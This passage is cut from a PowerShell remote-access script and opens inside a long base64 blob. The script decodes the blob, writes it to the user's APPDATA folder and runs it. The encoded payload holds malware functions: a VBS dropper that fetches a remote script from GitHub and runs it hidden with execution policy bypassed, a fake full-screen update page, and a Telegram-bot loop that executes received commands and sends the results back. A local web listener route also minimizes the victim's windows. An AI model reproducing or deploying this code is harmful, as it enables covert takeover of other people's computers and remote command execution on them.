oIC1Gb3JjZQ0Kc2xlZXAgMQ0KU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJHB0aA0KV3JpdGUtT3V0cHV0ICJEb25lLiINCnNsZWVwIDMNClJlbW92ZS1JdGVtIC1QYXRoICRwdGggLUZvcmNlDQp9DQoNCkZ1bmN0aW9uIENvbXB1dGVyQWNpZCB7DQokdG9iYXQgPSBAJw0KU2V0IFdzaFNoZWxsID0gV1NjcmlwdC5DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KV1NjcmlwdC5TbGVlcCAyMDANCldzaFNoZWxsLlJ1biAicG93ZXJzaGVsbC5leGUgLU5vbkkgLU5vUCAtRXAgQnlwYXNzIC1XIEggLUMgaHR0cHM6Ly9naXRodWIuY29tL2JlaWdld29ybS9hc3NldHMvYmxvYi9tYWluL1NjcmlwdHMvR0RJLWhhdW50ZXIucHMxIHwgaWV4IiwgMCwgVHJ1ZQ0KJ0ANCiRwdGggPSAiJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXDEwMjAudmJzIg0KJHRvYmF0IHwgT3V0LUZpbGUgLUZpbGVQYXRoICRwdGggLUZvcmNlDQpzbGVlcCAxDQpTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkcHRoDQpXcml0ZS1PdXRwdXQgIkRvbmUuIg0Kc2xlZXAgMw0KUmVtb3ZlLUl0ZW0gLVBhdGggJHB0aCAtRm9yY2UNCn0NCg0KRnVuY3Rpb24gRmFrZVVwZGF0ZSB7DQokdG9iYXQgPSBAJw0KU2V0IFdzaFNoZWxsID0gV1NjcmlwdC5DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KV3NoU2hlbGwuUnVuICJDOlxXaW5kb3dzXFN5c3RlbTMyXHNjcm5zYXZlLnNjciINCldzaFNoZWxsLlJ1biAiY2hyb21lLmV4ZSAtLW5ldy13aW5kb3cgLWtpb3NrIGh0dHBzOi8vZmFrZXVwZGF0ZS5uZXQvd2luOCIsIDEsIEZhbHNlDQpXU2NyaXB0LlNsZWVwIDIwMA0KV3NoU2hlbGwuU2VuZEtleXMgIntGMTF9Ig0KJ0ANCiRwdGggPSAiJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXDEwMjEudmJzIg0KJHRvYmF0IHwgT3V0LUZpbGUgLUZpbGVQYXRoICRwdGggLUZvcmNlDQpzbGVlcCAxDQpTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkcHRoDQpzbGVlcCAzDQpSZW1vdmUtSXRlbSAtUGF0aCAkcHRoIC1Gb3JjZQ0KfQ0KDQpGdW5jdGlvbiBJc0F1dGh7cGFyYW0oJENoZWNrTWVzc2FnZSlpZigoJG1lc3NhZ2VzLm1lc3NhZ2UuZGF0ZSAtbmUgJExhc3RVbkF1dGhNc2cpIC1hbmQgKCRDaGVja01lc3NhZ2UubWVzc2FnZS50ZXh0IC1saWtlICRQYXNzUGhyYXNlKSAtYW5kICgkQ2hlY2tNZXNzYWdlLm1lc3NhZ2UuZnJvbS5pc19ib3QgLWxpa2UgJGZhbHNlKSl7DQokc2NyaXB0OkFjY2VwdGVkU2Vzc2lvbj0iQXV0aGVudGljYXRlZCI7JE10UyA9IE5ldy1PYmplY3QgcHNvYmplY3QgOyRNdFMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAnY2hhdF9pZCcgLVZhbHVlICRDaGF0SUQNCiRNdFMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAndGV4dCcgLVZhbHVlICIkZW52OkNPTVBVVEVSTkFNRSBTZXNzaW9uIFN0YXJ0ZWQuIg0KSW52b2tlLVJlc3RNZXRob2QgLU1ldGhvZCBQb3N0IC1VcmkgKCRVUkwgKycvc2VuZE1lc3NhZ2UnKSAtQm9keSAoJE10UyB8IENvbnZlcnRUby1Kc29uKSAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb24iO3JldHVybiAkbWVzc2FnZXMubWVzc2FnZS5jaGF0LmlkfUVsc2V7fX0NCg0KRnVuY3Rpb24gU3RybUZYe3BhcmFtKCRTdHJlYW0pOyRGaXhlZFJlc3VsdD1AKCk7JFN0cmVhbSB8IE91dC1GaWxlIC1GaWxlUGF0aCAoSm9pbi1QYXRoICRlbnY6VE1QIC1DaGlsZFBhdGggIlRHUFNNZXNzYWdlcy50eHQiKSAtRm9yY2UNCiRSZWFkQXNBcnJheT0gR2V0LUNvbnRlbnQgLVBhdGggKEpvaW4tUGF0aCAkZW52OlRNUCAtQ2hpbGRQYXRoICJUR1BTTWVzc2FnZXMudHh0IikgfCB3aGVyZSB7JF8ubGVuZ3RoIC1ndCAwfQ0KZm9yZWFjaCAoJGxpbmUgaW4gJFJlYWRBc0FycmF5KXskQXJyT2JqPU5ldy1PYmplY3QgcHNvYmplY3Q7JEFyck9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJMaW5lIiAtVmFsdWUgKCRsaW5lKS50b3N0cmluZygpOyRGaXhlZFJlc3VsdCArPSRBcnJPYmp9cmV0dXJuICRGaXhlZFJlc3VsdH0NCg0KRnVuY3Rpb24gc3RnbXNne3BhcmFtKCRNZXNzYWdldGV4dCwkQ2hhdElEKTskRml4ZWRUZXh0PVN0cm1GWCAtU3RyZWFtICRNZXNzYWdldGV4dA0KJE10UyA9IE5ldy1PYmplY3QgcHNvYmplY3Q7JE10UyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICdjaGF0X2lkJyAtVmFsdWUgJENoYXRJRDskTXRTIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ3RleHQnIC1WYWx1ZSAkRml4ZWRUZXh0LmxpbmUNCiRKc29uRGF0YT0oJE10UyB8IENvbnZlcnRUby1Kc29uKTtJbnZva2UtUmVzdE1ldGhvZCAtTWV0aG9kIFBvc3QgLVVyaSAoJFVSTCArJy9zZW5kTWVzc2FnZScpIC1Cb2R5ICRKc29uRGF0YSAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb24ifQ0KDQpGdW5jdGlvbiBydGdtc2d7dHJ5eyRpbk1lc3NhZ2U9SW52b2tlLVJlc3RNZXRob2QgLU1ldGhvZCBHZXQgLVVyaSAoJFVSTCArJy9nZXRVcGRhdGVzJykgLUVycm9yQWN0aW9uIFN0b3A7cmV0dXJuICRpbk1lc3NhZ2UucmVzdWx0Wy0xXX1DYXRjaHt9fQ0KU2xlZXAgMw0KDQpXaGlsZSAoJHRydWUpew0Kc2xlZXAgMQ0KJG1lc3NhZ2VzPXJ0Z21zZw0KaWYgKCRMYXN0VW5BdXRoTXNnIC1saWtlICRudWxsKXskTGFzdFVuQXV0aE1zZz0kbWVzc2FnZXMubWVzc2FnZS5kYXRlfTtpZiAoISgkQWNjZXB0ZWRTZXNzaW9uKSl7JENoZWNrQXV0aGVudGljYXRpb249SXNBdXRoIC1DaGVja01lc3NhZ2UgJG1lc3NhZ2VzfQ0KRWxzZXtpZiAoKCRDaGVja0F1dGhlbnRpY2F0aW9uIC1uZSAwKSAtYW5kICgkbWVzc2FnZXMubWVzc2FnZS50ZXh0IC1ub3RsaWtlICRQYXNzUGhyYXNlKSAtYW5kICgkbWVzc2FnZXMubWVzc2FnZS5kYXRlIC1uZSAkbXNnSUQpKXsNCnRyeXskUmVzdWx0PWllYHgoJG1lc3NhZ2VzLm1lc3NhZ2UudGV4dCkgLUVycm9yQWN0aW9uIFN0b3A7ICRSZXN1bHQNCnN0Z21zZyAtTWVzc2FnZXRleHQgJFJlc3VsdCAtQ2hhdElEICRtZXNzYWdlcy5tZXNzYWdlLmNoYXQuaWR9DQpjYXRjaCB7c3RnbXNnIC1NZXNzYWdldGV4dCAoJF8uZXhjZXB0aW9uLm1lc3NhZ2UpIC1DaGF0SUQgJG1lc3NhZ2VzLm1lc3NhZ2UuY2hhdC5pZH0NCkZpbmFsbHl7JG1zZ0lEPSRtZXNzYWdlcy5tZXNzYWdlLmRhdGV9fX0NCn0NCg=='
$decodedFile = [System.Convert]::FromBase64String($basey);$File = "$env:APPDATA\Microsoft\Windows\x32"+".ps1"
Set-Content -Path $File -Value $decodedFile -Encoding Byte -Force
& $file
}
elseif ($ctx.Request.RawUrl -match "^/mini") {     
$apps = New-Object -ComObject Shell.Application
$apps.MinimizeAll()
Write-Output "Done."
}


    }
    catch [System.Net.HttpListenerException] {
        Write-Host "==== Server Information ====" -ForegroundColor Green
        Write-Host ($_);
    }
}
Write-Host "Server Stopped!" -ForegroundColor Green